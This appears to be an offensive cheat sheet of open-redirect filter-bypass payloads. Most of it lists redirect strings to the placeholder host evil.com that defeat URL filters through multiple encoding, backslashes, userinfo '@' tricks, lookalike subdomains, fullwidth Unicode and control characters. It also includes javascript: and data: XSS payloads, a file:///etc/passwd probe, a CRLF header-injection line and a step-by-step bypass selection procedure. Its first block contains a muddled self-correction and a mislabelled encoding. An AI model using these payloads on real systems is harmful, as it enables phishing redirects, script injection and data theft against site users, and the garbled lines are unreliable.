# Evasion — the bypass arms that survive a hardened filter

## The hardened-filter arms — the residual bypasses

When the common arms all fail, the residual surface is:

### 1. The multi-decode arms

```text
the server decodes ONCE, the browser decodes AGAIN — or vice-versa:
%252f%252fevil.com     <- the double-encoded //
%255cevil.com          <- the double-encoded \
%2525cevil.com         <- a triple-encoded \ (%25->%->\? — %25 is '%')
                       wait — %25 -> '%', so %255c -> %5c -> \
%252fevil.com          <- %2f -> /
```

### 2. The mixed-boundary arms

```text
/%2fevil.com           <- a / + encoded /
/%5cevil.com           <- a / + encoded \
/\%2fevil.com          <- a /\ + encoded /
%2f%5cevil.com         <- encoded / + encoded \
%5c%2fevil.com         <- encoded \ + encoded /
/\/evil.com            <- a / + \ + /
\\%5cevil.com          <- a \\ + encoded \
```

### 3. The scheme-boundary arms

```text
https:evil.com         <- a scheme with no //
https:/evil.com        <- one /
https:/\evil.com       <- a scheme + /\
https:\\evil.com       <- a scheme + \\
https:/\/evil.com      <- a scheme + /\/
https:%5cevil.com      <- a scheme + encoded \
https:%2fevil.com      <- a scheme + encoded /
https:/%2fevil.com     <- a scheme + / + encoded /
HtTpS://evil.com       <- a case-variant scheme
```

### 4. The userinfo-boundary arms

```text
https://evil.com\@target.com        <- the \@
https://evil.com%40target.com       <- the %40
https://evil.com%2540target.com     <- the double-encoded @
https://target.com:443@evil.com     <- userinfo + port
https://evil.com?@target.com        <- the @ in the query
https://evil.com#@target.com        <- the @ in the fragment
https://evil.com%2f%40target.com    <- an encoded /@
https://evil.com%3f%40target.com    <- an encoded ?@
https://evil.com%23%40target.com    <- an encoded #@
```

### 5. The subdomain-boundary arms

```text
https://target.com.evil.com          <- a subdomain
https://target.com-evil.com          <- a hyphen-suffix
https://eviltarget.com               <- a no-boundary contains-match
https://x.target.com@evil.com        <- a subdomain-userinfo mix
https://target.com.evil.com.evil.com <- a deeper subdomain
https://target.com.                  <- the trailing-dot (DNS-normalizes)
https://target.com%2eevil.com        <- an encoded . in the host
```

### 6. The unicode-boundary arms

```text
https:%ef%bc%8f%ef%bc%8fevil.com        <- fullwidth //
https://evil%ef%bc%8ecom                <- fullwidth .
https://evil%ef%bc%a0target.com         <- fullwidth @
https://evil.com%ef%bc%83target.com     <- fullwidth #
https://evil.com%ef%bc%9ftarget.com     <- fullwidth ?
evil%E3%80%82com                        <- ideographic 。
https://%65vil.com                      <- an encoded host-char
https://evil%2ecom                      <- the encoded . alone
```

### 7. The whitespace/control arms

```text
%20https://evil.com          <- leading space
%09https://evil.com          <- leading tab
%0ahttps://evil.com          <- leading LF
%0d%0ahttps://evil.com       <- leading CRLF
https://evil.com%20          <- trailing
  https://evil.com           <- a literal leading space (unencoded)
https://evil.com%0d%0aSet-Cookie:x=y  <- the CRLF-split twin
```

### 8. The scheme family

```text
javascript:alert(1)                  <- the JS-scheme XSS-twin
javascript://%0aalert(1)             <- the comment-obfuscated
javascript://x%0aalert(1)            <- a variant
data:text/html,<script>alert(1)</script>     <- the data: XSS
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==  <- b64 data:
vbscript:msgbox(1)                   <- the vbscript: legacy
file:///etc/passwd                   <- the file: LFI-twin
jar:https://evil.com!/x              <- the jar: scheme — legacy Java
intent://evil.com                    <- the intent: — Android deep-link
```

### 9. The case/whitespace/case-mix arms

```text
HTTPS://evil.com           <- a case-scheme
https://EVIL.COM           <- a case-host
Https://Evil.Com           <- a mixed
hTTps:%2f%2fEvIl.CoM       <- a case+encode mix
```

### 10. The port/authority arms

```text
https://evil.com:443       <- an explicit port
https://target.com:443@evil.com   <- a port-userinfo
https://evil.com:443@target.com   <- the reverse
https://target.com.@evil.com      <- a trailing-dot userinfo
```

## The arm-selection discipline

```text
1. fingerprint the filter — ONE canary -> the Location shape names it
2. pick the arm matching the filter — the filter-bypass matrix
3. try the encode-variant of the SAME arm before a new arm
4. a uniform `Location: <safe>` on all arms = the falsifier
```

## The evasion-record

`evasion: <the-filter>: <the-arm>: <the-decode-stage>` — the filter shape,
the residual arm that survives it, and the decode-stage mismatch.
